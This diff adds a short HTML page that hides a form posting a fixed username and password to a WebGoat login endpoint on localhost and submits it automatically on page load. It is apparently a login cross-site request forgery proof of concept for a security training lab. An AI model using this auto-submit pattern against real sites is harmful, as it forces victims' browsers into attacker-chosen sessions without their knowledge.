@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Auto Submit Form</title>
+</head>
+<body>
+    <form id="loginForm" action="http://localhost:8080/WebGoat/login" method="POST" style="width: 300px;">
+        <input type="hidden" name="username" value="csrfman" />
+        <input type="hidden" name="password" value="123456" />
+    </form>
+
+
+    <script>
+        window.onload = function() {
+        document.getElementById("loginForm").submit();
+        };
+    </script>
+</body>
+</html>
